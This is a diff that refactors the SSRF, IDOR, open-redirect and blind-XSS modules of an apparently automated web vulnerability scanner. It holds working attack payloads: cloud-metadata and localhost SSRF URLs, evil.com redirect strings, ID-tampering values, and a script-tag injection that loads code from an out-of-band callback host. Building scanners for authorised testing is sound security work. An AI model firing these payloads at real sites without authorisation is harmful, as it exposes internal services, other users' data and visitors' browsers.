@@ -22,62 +22,81 @@ class SSRFSkill(BaseSkill):
     description = "Test for SSRF by injecting internal URLs and callback endpoints"
     
     async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        import httpx
-        
+        from urllib.parse import urlparse, parse_qs
+
         findings = []
         parsed = urlparse(url)
         query_params = parse_qs(parsed.query)
-        
-        # SSRF parameters to test
+
+        # Test each parameter for SSRF
+        for param_name in query_params:
+            if self._is_ssrf_parameter(param_name):
+                param_findings = await self._test_ssrf_parameter(url, parsed, query_params, param_name)
+                findings.extend(param_findings)
+
+        return {"success": True, "findings": findings}
+
+    def _is_ssrf_parameter(self, param_name: str) -> bool:
+        """Check if parameter name suggests SSRF vulnerability."""
         ssrf_params = ["url", "uri", "path", "dest", "redirect", "go", "out", "next", "target", "callback"]
-        
-        # SSRF payloads
+        return any(x in param_name.lower() for x in ssrf_params)
+
+    async def _test_ssrf_parameter(self, url: str, parsed, query_params: dict, param_name: str) -> list:
+        """Test a parameter for SSRF vulnerabilities."""
+        from urllib.parse import urlencode, urlunparse
+        import httpx
+
+        findings = []
         ssrf_payloads = [
-            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
+            "http://169.254.169.254/latest/meta-data/",
             "http://127.0.0.1:22/",
             "http://localhost:80/",
             "http://[::1]/",
         ]
-        
-        for param_name in query_params:
-            if any(x in param_name.lower() for x in ssrf_params):
-                for payload in ssrf_payloads:
-                    test_params = query_params.copy()
-                    test_params[param_name] = [payload]
-                    
-                    test_url = urlunparse((
-                        parsed.scheme, parsed.netloc, parsed.path,
-                        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
-                    ))
-                    
-                    try:
-                        async with httpx.AsyncClient(timeout=10.0) as client:
-                            response = await client.get(test_url)
-                            
-                            # Look for SSRF indicators in response
-                            ssrf_indicators = [
-                                "ami-id", "instance-id", "localhost", "127.0.0.1"
-                            ]
-                            
-                            for indicator in ssrf_indicators:
-                                if indicator in response.text:
-                                    findings.append({
-                                        "type": "SSRF",
-                                        "url": url,
-                                        "parameter": param_name,
-                                        "payload": payload,
-                                        "evidence": indicator,
-                                        "severity": "HIGH",
-                                        "description": f"Server-Side Request Forgery (SSRF) detected. The parameter '{param_name}' allows making requests to internal resources. Indicator found: {indicator}",
-                                        "reproduction": f"curl '{test_url}' | grep -i '{indicator}'"
-                                    })
-                                    logger.info(f"[{self.master.name}] ✅ SSRF detected: {indicator}")
-                                    break
-                    except Exception as e:
-                        logger.debug(f"SSRF/IDOR/OpenRedirect test failed: {e}")
-        
-        return {"success": True, "findings": findings}
+
+        for payload in ssrf_payloads:
+            test_params = query_params.copy()
+            test_params[param_name] = [payload]
+
+            test_url = urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
+            ))
+
+            finding = await self._check_ssrf_response(url, test_url, param_name, payload)
+            if finding:
+                findings.append(finding)
+                break
+
+        return findings
+
+    async def _check_ssrf_response(self, url: str, test_url: str, param_name: str, payload: str):
+        """Check HTTP response for SSRF indicators."""
+        import httpx
+
+        try:
+            async with httpx.AsyncClient(timeout=10.0) as client:
+                response = await client.get(test_url)
+
+                ssrf_indicators = ["ami-id", "instance-id", "localhost", "127.0.0.1"]
+
+                for indicator in ssrf_indicators:
+                    if indicator in response.text:
+                        logger.info(f"[{self.master.name}] ✅ SSRF detected: {indicator}")
+                        return {
+                            "type": "SSRF",
+                            "url": url,
+                            "parameter": param_name,
+                            "payload": payload,
+                            "evidence": indicator,
+                            "severity": "HIGH",
+                            "description": f"Server-Side Request Forgery (SSRF) detected. The parameter '{param_name}' allows making requests to internal resources. Indicator found: {indicator}",
+                            "reproduction": f"curl '{test_url}' | grep -i '{indicator}'"
+                        }
+        except Exception as e:
+            logger.debug(f"SSRF test failed: {e}")
+
+        return None
 
 
 class IDORSkill(BaseSkill):
@@ -86,66 +105,85 @@ class IDORSkill(BaseSkill):
     description = "Test for IDOR by manipulating ID parameters"
     
     async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        import httpx
-        
+        from urllib.parse import urlparse, parse_qs
+
         findings = []
         parsed = urlparse(url)
         query_params = parse_qs(parsed.query)
-        
-        # ID parameters to test
-        id_params = ["id", "user_id", "uid", "account", "order", "file", "doc", "page"]
-        
+
+        # Test each ID parameter
         for param_name in query_params:
-            if any(x in param_name.lower() for x in id_params):
+            if self._is_id_parameter(param_name):
                 original_value = query_params[param_name][0]
-                
-                # Try common IDOR values
-                test_values = ["1", "0", "admin", "-1"]
-                
-                # Try incrementing/decrementing if numeric
-                try:
-                    int_val = int(original_value)
-                    test_values.append(str(int_val + 1))
-                    test_values.append(str(int_val - 1))
-                except ValueError:
-                    pass
-                
-                for test_val in test_values:
-                    if test_val == original_value:
-                        continue
-                        
-                    test_params = query_params.copy()
-                    test_params[param_name] = [test_val]
-                    
-                    test_url = urlunparse((
-                        parsed.scheme, parsed.netloc, parsed.path,
-                        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
-                    ))
-                    
-                    try:
-                        async with httpx.AsyncClient(timeout=10.0) as client:
-                            response = await client.get(test_url)
-                            
-                            # If 200 OK with different value, potential IDOR
-                            if response.status_code == 200:
-                                findings.append({
-                                    "type": "IDOR (Potential)",
-                                    "url": url,
-                                    "parameter": param_name,
-                                    "original_value": original_value,
-                                    "tested_value": test_val,
-                                    "note": "Manual verification required",
-                                    "severity": "MEDIUM",
-                                    "description": f"Potential Insecure Direct Object Reference (IDOR). Parameter '{param_name}' accepts different ID values ({original_value} → {test_val}) returning 200 OK. Manual verification needed to confirm unauthorized data access.",
-                                    "reproduction": f"# Original: curl '{url}'\n# IDOR test: curl '{test_url}'"
-                                })
-                                logger.info(f"[{self.master.name}] ⚠️ Potential IDOR on {param_name}")
-                                break
-                    except Exception as e:
-                        logger.debug(f"IDOR test failed: {e}")
-        
+                param_findings = await self._test_idor_parameter(url, parsed, query_params, param_name, original_value)
+                findings.extend(param_findings)
+
         return {"success": True, "findings": findings}
+
+    def _is_id_parameter(self, param_name: str) -> bool:
+        """Check if parameter name suggests ID-based access."""
+        id_params = ["id", "user_id", "uid", "account", "order", "file", "doc", "page"]
+        return any(x in param_name.lower() for x in id_params)
+
+    def _generate_idor_test_values(self, original_value: str) -> list:
+        """Generate test values for IDOR testing."""
+        test_values = ["1", "0", "admin", "-1"]
+
+        try:
+            int_val = int(original_value)
+            test_values.append(str(int_val + 1))
+            test_values.append(str(int_val - 1))
+        except ValueError:
+            pass
+
+        return test_values
+
+    async def _test_idor_parameter(self, url: str, parsed, query_params: dict, param_name: str, original_value: str) -> list:
+        """Test a parameter for IDOR vulnerabilities."""
+        from urllib.parse import urlencode, urlunparse
+        import httpx
+
+        findings = []
+        test_values = self._generate_idor_test_values(original_value)
+
+        for test_val in test_values:
+            if test_val == original_value:
+                continue
+
+            test_params = query_params.copy()
+            test_params[param_name] = [test_val]
+
+            test_url = urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
+            ))
+
+            try:
+                async with httpx.AsyncClient(timeout=10.0) as client:
+                    response = await client.get(test_url)
+
+                    if response.status_code == 200:
+                        findings.append(self._build_idor_finding(url, test_url, param_name, original_value, test_val))
+                        logger.info(f"[{self.master.name}] ⚠️ Potential IDOR on {param_name}")
+                        break
+            except Exception as e:
+                logger.debug(f"IDOR test failed: {e}")
+
+        return findings
+
+    def _build_idor_finding(self, url: str, test_url: str, param_name: str, original_value: str, test_val: str) -> dict:
+        """Build IDOR finding data structure."""
+        return {
+            "type": "IDOR (Potential)",
+            "url": url,
+            "parameter": param_name,
+            "original_value": original_value,
+            "tested_value": test_val,
+            "note": "Manual verification required",
+            "severity": "MEDIUM",
+            "description": f"Potential Insecure Direct Object Reference (IDOR). Parameter '{param_name}' accepts different ID values ({original_value} → {test_val}) returning 200 OK. Manual verification needed to confirm unauthorized data access.",
+            "reproduction": f"# Original: curl '{url}'\n# IDOR test: curl '{test_url}'"
+        }
 
 
 class OpenRedirectSkill(BaseSkill):
@@ -154,58 +192,73 @@ class OpenRedirectSkill(BaseSkill):
     description = "Test for Open Redirect vulnerabilities"
     
     async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        import httpx
-        
+        from urllib.parse import urlparse, parse_qs
+
         findings = []
         parsed = urlparse(url)
         query_params = parse_qs(parsed.query)
-        
-        # Redirect parameters to test
+
+        # Test each redirect parameter
+        for param_name in query_params:
+            if self._is_redirect_parameter(param_name):
+                param_findings = await self._test_redirect_parameter(url, parsed, query_params, param_name)
+                findings.extend(param_findings)
+
+        return {"success": True, "findings": findings}
+
+    def _is_redirect_parameter(self, param_name: str) -> bool:
+        """Check if parameter name suggests redirect functionality."""
         redirect_params = ["url", "redirect", "next", "return", "goto", "target", "dest", "redir"]
-        
-        # Redirect payloads
+        return any(x in param_name.lower() for x in redirect_params)
+
+    async def _test_redirect_parameter(self, url: str, parsed, query_params: dict, param_name: str) -> list:
+        """Test a parameter for open redirect vulnerabilities."""
+        from urllib.parse import urlencode, urlunparse
+        import httpx
+
+        findings = []
         redirect_payloads = [
             "https://evil.com",
             "//evil.com",
             "/\\evil.com",
             "https://evil.com%2F%2F",
         ]
-        
-        for param_name in query_params:
-            if any(x in param_name.lower() for x in redirect_params):
-                for payload in redirect_payloads:
-                    test_params = query_params.copy()
-                    test_params[param_name] = [payload]
-                    
-                    test_url = urlunparse((
-                        parsed.scheme, parsed.netloc, parsed.path,
-                        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
-                    ))
-                    
-                    try:
-                        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
-                            response = await client.get(test_url)
-                            
-                            # Check redirect headers
-                            location = response.headers.get("location", "")
-                            if "evil.com" in location:
-                                findings.append({
-                                    "type": "Open Redirect",
-                                    "url": url,
-                                    "parameter": param_name,
-                                    "payload": payload,
-                                    "redirected_to": location,
-                                    "severity": "MEDIUM",
-                                    "description": f"Open Redirect vulnerability. Parameter '{param_name}' allows redirecting users to external domains. Server redirects to: {location}",
-                                    "reproduction": f"curl -I '{test_url}' | grep -i location"
-                                })
-                                logger.info(f"[{self.master.name}] ✅ Open Redirect: {location}")
-                                break
-                    except Exception as e:
-                        logger.debug(f"Open redirect test failed: {e}")
-        
-        return {"success": True, "findings": findings}
+
+        for payload in redirect_payloads:
+            test_params = query_params.copy()
+            test_params[param_name] = [payload]
+
+            test_url = urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
+            ))
+
+            try:
+                async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
+                    response = await client.get(test_url)
+
+                    location = response.headers.get("location", "")
+                    if "evil.com" in location:
+                        findings.append(self._build_redirect_finding(url, test_url, param_name, payload, location))
+                        logger.info(f"[{self.master.name}] ✅ Open Redirect: {location}")
+                        break
+            except Exception as e:
+                logger.debug(f"Open redirect test failed: {e}")
+
+        return findings
+
+    def _build_redirect_finding(self, url: str, test_url: str, param_name: str, payload: str, location: str) -> dict:
+        """Build open redirect finding data structure."""
+        return {
+            "type": "Open Redirect",
+            "url": url,
+            "parameter": param_name,
+            "payload": payload,
+            "redirected_to": location,
+            "severity": "MEDIUM",
+            "description": f"Open Redirect vulnerability. Parameter '{param_name}' allows redirecting users to external domains. Server redirects to: {location}",
+            "reproduction": f"curl -I '{test_url}' | grep -i location"
+        }
 
 
 class OOBXSSSkill(BaseSkill):
@@ -214,56 +267,69 @@ class OOBXSSSkill(BaseSkill):
     description = "Test for Blind XSS using out-of-band callbacks"
     
     async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        from bugtrace.tools.interactsh import get_oob_url
-        import httpx
-        
+        from urllib.parse import urlparse, parse_qs
+
         findings = []
         parsed = urlparse(url)
         query_params = parse_qs(parsed.query)
-        
+
+        # Inject payloads for all parameters
+        callback_urls = await self._inject_oob_payloads(url, parsed, query_params)
+
+        # Build finding report
+        if callback_urls:
+            findings.append(self._build_oob_finding(url, callback_urls))
+
+        return {"success": True, "findings": findings}
+
+    async def _inject_oob_payloads(self, url: str, parsed, query_params: dict) -> list:
+        """Inject OOB XSS payloads and return callback URLs."""
+        from urllib.parse import urlencode, urlunparse
+        from bugtrace.tools.interactsh import get_oob_url
+        import httpx
+
         callback_urls = []
-        
+
         for param_name in query_params:
-            # Generate unique callback for this param
             callback = get_oob_url(f"xss_{param_name}")
             callback_urls.append((param_name, callback))
-            
-            # Blind XSS payload
+
             payload = f'"><script src=http://{callback}/x></script>'
-            
+
             test_params = query_params.copy()
             test_params[param_name] = [payload]
-            
+
             test_url = urlunparse((
                 parsed.scheme, parsed.netloc, parsed.path,
                 parsed.params, urlencode(test_params, doseq=True), parsed.fragment
             ))
-            
+
             try:
                 async with httpx.AsyncClient(timeout=10.0) as client:
                     await client.get(test_url)
             except Exception as e:
                 logger.debug(f"OOB XSS payload injection failed: {e}")
-        
-        # Log callback URLs for user reference
+
+        # Log callback URLs for monitoring
         if callback_urls:
             logger.info(f"[{self.master.name}] OOB XSS payloads sent. Monitor callbacks:")
             for param, cb in callback_urls:
                 logger.info(f"  - {param}: {cb}")
-            
-            callbacks_dict = {param: cb for param, cb in callback_urls}
-            findings.append({
-                "type": "Blind XSS (Payload Sent)",
-                "url": url,
-                "callbacks": callbacks_dict,
-                "note": "Monitor Interactsh for callbacks",
-                "severity": "INFO",
-                "description": f"Blind XSS payloads injected into {len(callback_urls)} parameters. If callbacks are received on Interactsh, XSS is confirmed. Payloads execute when viewed by admin/other users.",
-                "reproduction": f"# Monitor these callback URLs for hits:\n" + "\n".join([f"# {p}: {c}" for p, c in callback_urls[:3]])
-            })
-        
-        return {"success": True, "findings": findings}
+
+        return callback_urls
+
+    def _build_oob_finding(self, url: str, callback_urls: list) -> dict:
+        """Build OOB XSS finding data structure."""
+        callbacks_dict = {param: cb for param, cb in callback_urls}
+        return {
+            "type": "Blind XSS (Payload Sent)",
+            "url": url,
+            "callbacks": callbacks_dict,
+            "note": "Monitor Interactsh for callbacks",
+            "severity": "INFO",
+            "description": f"Blind XSS payloads injected into {len(callback_urls)} parameters. If callbacks are received on Interactsh, XSS is confirmed. Payloads execute when viewed by admin/other users.",
+            "reproduction": f"# Monitor these callback URLs for hits:\n" + "\n".join([f"# {p}: {c}" for p, c in callback_urls[:3]])
+        }
 
 
 class CSRFSkill(BaseSkill):
